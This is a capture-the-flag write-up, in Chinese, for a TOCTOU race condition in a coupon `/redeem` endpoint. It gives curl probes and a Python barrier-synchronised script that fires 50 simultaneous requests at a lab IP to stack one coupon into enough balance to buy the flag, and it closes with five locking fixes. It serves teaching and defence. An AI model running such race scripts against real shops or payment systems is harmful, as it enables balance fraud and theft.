# 34 · Logic Race Condition (TOCTOU)

> 靶机：`http://47.120.76.57:35003` · 目标：拿到 `TOGOGO-flag{...}`

## 一句话漏洞
`/redeem` 的 `read → check used → sleep(0.15) → read → +10 → write` 不在同一临界区——`sleep` 内多个线程都已通过 `used` 检查，于是 `GIFT10` 被并发累加到 `≥100`，再 `/buy` 换 flag。

## 接口速览
| 方法 | 路径 | 作用 |
|---|---|---|
| GET  | `/`        | 余额 + 说明 |
| POST | `/redeem`  | 表单 `code=GIFT10`，正常只 +10 一次 |
| POST | `/buy`     | 余额 ≥100 → 返回 flag，balance -=100 |
| GET  | `/reset`   | 重置状态 |

## 手工三步走

**① 摸基线（确认单次只 +10）**
```bash
B=http://47.120.76.57:35003
curl -s "$B/reset" -o /dev/null
curl -s -X POST "$B/redeem" -d "code=GIFT10"   # {"balance":10,"ok":true}
curl -s -X POST "$B/redeem" -d "code=GIFT10"   # {"msg":"already used","ok":false}
```

**② 时延扫描（找到 race window）**
```bash
curl -s "$B/reset" -o /dev/null
time curl -s -X POST "$B/redeem" -d "code=GIFT10" >/dev/null   # ≈0.15s
```
> 0.15s 的 sleep 就是 race window，并发期间所有线程都仍认为 `used=false`。

**③ Barrier 对齐并发**
```python
# race.py
import threading, requests
B, N = "http://47.120.76.57:35003", 50
requests.get(B + "/reset", allow_redirects=False)
bar = threading.Barrier(N)
def hit():
    bar.wait()
    requests.post(B + "/redeem", data={"code":"GIFT10"},
                  headers={"Connection":"close"}, timeout=20)
ts = [threading.Thread(target=hit) for _ in range(N)]
[t.start() for t in ts]; [t.join() for t in ts]
```
```bash
python3 race.py
curl -s "$B/" | grep -oE "¥<b>[0-9]+"     # 期望 ≥100
curl -s -X POST "$B/buy"                  # 拿 flag
```

## 为什么必须 barrier？
若线程逐个发出，第一个写入 `used=True` 后续都会被 `already_used` 拦截。
`Barrier.wait()` 让 N 个线程**同时**越过 check，sleep 期间它们彼此看不到对方的写入。

## 调参速查
| 现象 | 处理 |
|---|---|
| 全部 already_used | barrier 没起作用，确认 `wait()` 在请求**之前** |
| 只 1~2 条 ok      | N 调大（50→100），或服务端线程不够，分多轮 |
| balance 累加但 <100 | 再跑 1 轮 race（不要 reset） |
| 大量 connection reset | 服务被打瘫，等 30~60 秒再来 |

## 一键脚本
```bash
python3 main.py
```
> `main.py` 已封装：reset → barrier 并发 → 检查 ≥100 → /buy → 提取 `TOGOGO-flag{...}`。balance 不够会自动再来一轮（最多 3 轮，不再 reset）。

## 修复思路（5 选 1）
1. `SELECT ... FOR UPDATE` 行锁
2. 原子 `UPDATE coupons SET used=1 WHERE code=? AND used=0` + 判 rowcount
3. 乐观锁 / CAS（version 字段）
4. 分布式锁（Redis `SETNX` + TTL）
5. 队列串行化（单 worker 消费）
> 文件锁也行，但必须**从 read 就开始持锁直到 write 落盘**；只在 write 加锁仍丢早期 read。

## 心智模型
> 「check → use」必须原子；中间任何 `sleep / IO / RPC` 都是 race window。
